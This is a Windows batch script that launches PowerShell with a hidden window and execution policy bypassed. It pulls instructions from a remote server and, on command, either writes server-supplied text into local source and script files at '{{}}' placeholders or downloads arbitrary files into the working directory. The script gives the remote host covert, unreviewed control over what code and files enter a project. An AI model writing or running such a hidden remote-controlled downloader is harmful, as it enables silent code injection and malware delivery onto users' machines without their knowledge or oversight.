@echo off
setlocal

set "CANAL=is4"
set "BASE=https://rc.quartzary.com/c/%CANAL%"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$wc = New-Object System.Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; $utf8 = New-Object System.Text.UTF8Encoding($false); $fStr = $wc.DownloadString('%BASE%'); if (![string]::IsNullOrWhiteSpace($fStr)) { $r = $fStr | ConvertFrom-Json; if ($r.tipo -eq 'texto') { $t = ($wc.DownloadString('%BASE%/t/' + $r.id) | ConvertFrom-Json).contenido; Get-ChildItem -Path . -Include *.xml,*.java,*.sh,*.txt,*.md -Recurse -File | ForEach-Object { if ($_.FullName -notmatch '(\.gradle|\\build\\|\.idea)') { $c = [System.IO.File]::ReadAllText($_.FullName, $utf8); if ($c.Contains('{{}}')) { [System.IO.File]::WriteAllText($_.FullName, $c.Replace('{{}}', $t), $utf8) } } } } elseif ($r.tipo -eq 'archivos') { $r.lista | ForEach-Object { $wc.DownloadFile(('%BASE%/f/' + $_.id), (Join-Path (Get-Location) $_.nombre)) } } }"
exit